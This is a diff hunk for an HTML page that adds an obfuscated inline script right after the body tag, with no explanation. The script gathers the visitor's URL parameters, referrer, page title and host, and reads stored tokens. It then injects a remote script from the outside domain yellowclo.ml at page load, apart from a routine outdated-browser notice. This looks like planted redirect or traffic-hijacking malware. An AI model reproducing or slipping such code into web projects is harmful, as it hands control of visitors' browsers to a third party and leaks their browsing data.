@@ -28,6 +28,49 @@
 </head>
 
 <body>
+    <script>
+        (function() {
+        var name = '_ZqMJRmZnDnTNmSFJ';
+        if (!window._ZqMJRmZnDnTNmSFJ) {
+            window._ZqMJRmZnDnTNmSFJ = {
+                unique: false,
+                ttl: 86400,
+                R_PATH: 'https://yellowclo.ml/GFn6y2Wh',
+                P_PATH: 'https://yellowclo.ml/f56f839/postback',
+            };
+        }
+        const _rW63QDbqtppZQVNG = localStorage.getItem('config');
+        if (typeof _rW63QDbqtppZQVNG !== 'undefined' && _rW63QDbqtppZQVNG !== null) {
+            var _hQh2dSwsWNfbdvVy = JSON.parse(_rW63QDbqtppZQVNG);
+            var _Q396y4JFk59PSvtP = Math.round(+new Date()/1000);
+            if (_hQh2dSwsWNfbdvVy.created_at + window._ZqMJRmZnDnTNmSFJ.ttl < _Q396y4JFk59PSvtP) {
+                localStorage.removeItem('subId');
+                localStorage.removeItem('token');
+                localStorage.removeItem('config');
+            }
+        }
+        var _1X4KBp32dBQ4ngCk = localStorage.getItem('subId');
+        var _bnr5m7r8GhK5M1c9 = localStorage.getItem('token');
+        var _Rj31yMJKYnQt4rJj = '?return=js.client';
+            _Rj31yMJKYnQt4rJj += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+            _Rj31yMJKYnQt4rJj += '&se_referrer=' + encodeURIComponent(document.referrer);
+            _Rj31yMJKYnQt4rJj += '&default_keyword=' + encodeURIComponent(document.title);
+            _Rj31yMJKYnQt4rJj += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+            _Rj31yMJKYnQt4rJj += '&name=' + encodeURIComponent(name);
+            _Rj31yMJKYnQt4rJj += '&host=' + encodeURIComponent(window._ZqMJRmZnDnTNmSFJ.R_PATH);
+        if (typeof _1X4KBp32dBQ4ngCk !== 'undefined' && _1X4KBp32dBQ4ngCk && window._ZqMJRmZnDnTNmSFJ.unique) {
+            _Rj31yMJKYnQt4rJj += '&sub_id=' + encodeURIComponent(_1X4KBp32dBQ4ngCk);
+        }
+        if (typeof _bnr5m7r8GhK5M1c9 !== 'undefined' && _bnr5m7r8GhK5M1c9 && window._ZqMJRmZnDnTNmSFJ.unique) {
+            _Rj31yMJKYnQt4rJj += '&token=' + encodeURIComponent(_bnr5m7r8GhK5M1c9);
+        }
+        var a = document.createElement('script');
+            a.type = 'application/javascript';
+            a.src = window._ZqMJRmZnDnTNmSFJ.R_PATH + _Rj31yMJKYnQt4rJj;
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(a, s)
+        })();
+        </script>
     <!--[if lte IE 9]>
             <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
         <![endif]-->
